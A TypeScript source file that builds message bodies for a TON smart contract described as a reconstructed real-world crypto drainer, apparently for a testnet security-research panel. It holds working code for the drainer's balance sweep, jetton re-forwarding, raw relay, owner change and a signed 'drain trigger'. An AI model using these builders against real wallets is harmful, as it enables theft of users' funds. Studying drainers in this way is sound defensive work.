// Body/message builders for the ResearchRelay (reconstructed_drainer_relay.fc)
// security-research contract. Ported from wrappers/ResearchRelay.ts, but
// stripped of the @ton/core ContractProvider dependency — TonConnect's
// sendTransaction only needs a destination address, an amount, and a
// base64-encoded body BoC, so these functions just return `Cell`s.
//
// TESTNET-ONLY. This mirrors a reconstructed real-world drainer contract for
// security research. Do not point this panel at a mainnet deployment or at
// any wallet other than your own test wallet.

import { Address, beginCell, Cell, Dictionary, BitString } from '@ton/core';

export const OP = {
    HEARTBEAT: 0xabcd3f13,
    SWEEP: 0xabcd1f13,
    FORWARD_JETTON: 0xabcd0f13,
    RAW_RELAY: 13371337,
    UPDATE_CONFIG: 12192683,
    SIGNED_TRIGGER: 0xabcdef13,
    TRANSFER_NOTIFICATION: 0x7362d09c,
} as const;

export const STANDARD_TRANSFER_OP = 0x0f8a7ea5; // TEP-74 op::transfer

// --- config_dict key helper (267-bit raw std-address bitstring) -----------
export const CONFIG_DICT_KEY_BITS = 267;

export function configDictKeyForAddress(address: Address): BitString {
    return beginCell().storeAddress(address).endCell().beginParse().loadBits(CONFIG_DICT_KEY_BITS);
}

export function emptyConfigDict(): Dictionary<BitString, boolean> {
    return Dictionary.empty(Dictionary.Keys.BitString(CONFIG_DICT_KEY_BITS), Dictionary.Values.Bool());
}

// --- op::0xabcd1f13 — owner-only balance sweep -----------------------------
export function buildSweepBody(sendMode: number): Cell {
    return beginCell().storeUint(OP.SWEEP, 32).storeUint(sendMode, 8).endCell();
}

// --- op::0xabcd0f13 — owner-only "re-forward as jetton transfer" ----------
export function buildForwardJettonBody(opts: {
    queryId: bigint;
    amount: bigint;
    jettonWalletAddr: Address;
    destination: Address;
}): Cell {
    return beginCell()
        .storeUint(OP.FORWARD_JETTON, 32)
        .storeUint(opts.queryId, 64)
        .storeCoins(opts.amount)
        .storeAddress(opts.jettonWalletAddr)
        .storeAddress(opts.destination)
        .endCell();
}

// --- op::13371337 — owner-only raw-message relay ---------------------------
export function buildRawRelayBody(opts: { dest: Address; value: bigint; sendMode: number; body: Cell }): Cell {
    return beginCell()
        .storeUint(OP.RAW_RELAY, 32)
        .storeAddress(opts.dest)
        .storeCoins(opts.value)
        .storeUint(opts.sendMode, 8)
        .storeRef(opts.body)
        .endCell();
}

// --- op::12192683 — owner-only config update -------------------------------
export function buildUpdateConfigBody(opts: {
    newOwner: Address;
    newConfigDict: Dictionary<BitString, boolean> | null;
    newFlag: boolean;
}): Cell {
    return beginCell()
        .storeUint(OP.UPDATE_CONFIG, 32)
        .storeAddress(opts.newOwner)
        .storeDict(opts.newConfigDict ?? null)
        .storeInt(opts.newFlag ? -1 : 0, 1)
        .endCell();
}

// --- op::0xabcdef13 — the externally pre-signed drain trigger --------------
//
// `signature` must be a 64-byte ed25519 signature over
// `cell_hash(beginCell().storeAddress(callerAddress).endCell())`, produced
// OFFLINE with the secret key matching this contract's stored publicKey.
// `callerAddress` is whoever's wallet sends this message — i.e. your
// connected TonConnect wallet's address. Never paste a secret key into this
// web app; sign the hash offline and paste only the resulting signature hex.
export function buildSignedTriggerBody(opts: {
    queryId: bigint;
    targetsDict?: Dictionary<number, Cell> | null;
    signature: Buffer; // 64 bytes
    forwardTarget: Address;
    modeBit?: boolean;
}): Cell {
    if (opts.signature.length !== 64) {
        throw new Error('signature must be exactly 64 bytes');
    }
    const sigCell = beginCell().storeBuffer(opts.signature).endCell();
    const addrCell = beginCell().storeInt(opts.modeBit ? -1 : 0, 1).storeAddress(opts.forwardTarget).endCell();

    return beginCell()
        .storeUint(OP.SIGNED_TRIGGER, 32)
        .storeUint(opts.queryId, 64)
        .storeDict(opts.targetsDict ?? null)
        .storeRef(sigCell)
        .storeRef(addrCell)
        .endCell();
}

// --- op::0x7362d09c — transfer_notification --------------------------------
//
// Non-standard forward_payload: THREE refs.
//   ref1 = 64-byte ed25519 signature over hash(senderAddress) — same scheme
//          as the signed trigger above. `senderAddress` is whoever's wallet
//          sends THIS message (your connected wallet, standing in for the
//          jetton-wallet that would normally fire this notification).
//   ref2 = payload, used only on the authorized (valid-signature) path.
//   ref3 = candidate redirect address, used only on the unauthorized path,
//          and only honored if it's a key in this contract's config_dict.
//          Pass `redirectAddress: null` for an empty ref3 (bails out with
//          no outgoing message at all, matching the original bytecode).
export function buildTransferNotificationBody(opts: {
    queryId: bigint;
    amount: bigint;
    fromAddress: Address;
    signature: Buffer; // 64 bytes
    payload?: Cell;
    redirectAddress?: Address | null;
}): Cell {
    if (opts.signature.length !== 64) {
        throw new Error('signature must be exactly 64 bytes');
    }
    const sigCell = beginCell().storeBuffer(opts.signature).endCell();
    const payloadCell = opts.payload ?? beginCell().endCell();
    const redirectCell =
        opts.redirectAddress != null ? beginCell().storeAddress(opts.redirectAddress).endCell() : beginCell().endCell();

    return beginCell()
        .storeUint(OP.TRANSFER_NOTIFICATION, 32)
        .storeUint(opts.queryId, 64)
        .storeCoins(opts.amount)
        .storeAddress(opts.fromAddress)
        .storeRef(sigCell)
        .storeRef(payloadCell)
        .storeRef(redirectCell)
        .endCell();
}

// --- helpers ----------------------------------------------------------------

/** Base64-encode a Cell's BoC the way TonConnect's `payload` field expects. */
export function cellToBase64Boc(cell: Cell): string {
    return cell.toBoc().toString('base64');
}

/** User-friendly (base64url) address string TonConnect's `messages[].address` requires. */
export function toUserFriendly(address: Address, opts?: { testnet?: boolean; bounceable?: boolean }): string {
    return address.toString({
        urlSafe: true,
        bounceable: opts?.bounceable ?? true,
        testOnly: opts?.testnet ?? true,
    });
}

export function hexToSignatureBuffer(hex: string): Buffer {
    const clean = hex.trim().replace(/^0x/i, '');
    if (clean.length !== 128) {
        throw new Error(`signature hex must decode to exactly 64 bytes (128 hex chars), got ${clean.length}`);
    }
    return Buffer.from(clean, 'hex');
}
